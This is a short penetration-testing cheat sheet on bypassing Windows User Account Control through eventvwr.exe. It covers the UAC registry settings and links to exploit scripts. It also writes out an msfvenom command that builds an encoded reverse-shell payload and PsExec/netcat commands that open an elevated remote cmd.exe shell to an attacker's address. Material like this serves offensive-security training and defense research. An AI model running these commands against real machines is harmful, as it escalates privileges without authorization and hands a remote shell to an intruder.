# UAC bypass

## Check configuration

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
```

### Registries

* `ConsentPromptBehaviorAdmin:`  UAC configuration \[0x0 - 0x5]
* `EnableLUA:` UAC enabled  \[0x0 / 0x1]
* `PromptOnSecureDesktop:` show screen prompt \[0x0 / 0x1]

#### Consent prompt behavior policies

| DWORD      | **Policy**                                                | **Description**                                                                                                                                                                                                                                                            |
| ---------- | --------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 0x00000000 | Elevate without prompting                                 | Allows privileged accounts to perform an operation that requires elevation without requiring consent or credentials.                                                                                                                                                       |
| 0x00000001 | Prompt for credentials on the secure desktop              | When an operation requires elevation of privilege, the user is prompted on the secure desktop to enter a privileged (ex: administrator) user name and password. If the user enters valid credentials, the operation continues with the user's highest available privilege. |
| 0x00000002 | Prompt for consent on the secure desktop                  | When an operation requires elevation of privilege, the user is prompted on the secure desktop to select either Yes or No. If the user selects Yes, the operation continues with the user's highest available privilege.                                                    |
| 0x00000003 | Prompt for credentials                                    | When an operation requires elevation of privilege, the user is prompted to enter an administrator user name and password. If the user enters valid credentials, the operation continues with the applicable privilege.                                                     |
| 0x00000004 | Prompt for consent                                        | When an operation requires elevation of privilege, the user is prompted to select either Yes or No. If the user selects Yes, the operation continues with the user's highest available privilege.                                                                          |
| 0x00000005 | Prompt for consent for non-Windows binaries **(Default)** | When an operation for a non-Microsoft application requires elevation of privilege, the user is prompted on the secure desktop to select either Yes or No. If the user selects Yes, the operation continues with the user's highest available privilege.                    |

## Eventvwr exploitation

### Requirements

* Windows 7, 8.1, 10
* `PromptOnSecureDesktop` == 5
* `eventvwr.exe` must exist and have self-elevating privileges

### Exploitation

#### Exploit scripts

* [Powershell script](https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1)
* [C file](https://github.com/turbo/zero2hero/blob/master/main.c). Don't forget to uncomment the `strcat` and `GetCurrentDirectory` commands and replace foobar.exe with your payload
* **exploit/windows/local/bypassuac\_eventvwr** Metasploit module

#### Payload

```
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -e x86/shikata_ga_nai > payload.exe
```

### Create elevated reverse shell

```
PsExec64.exe -i -accepteula -d -s ".\nc.exe <ip> <port> -e cmd.exe"
PsExec64.exe \\<machine> -accepteula -u <machine>\<user> -p <pass> ".\nc.exe <ip> <port> -e cmd.exe"
```
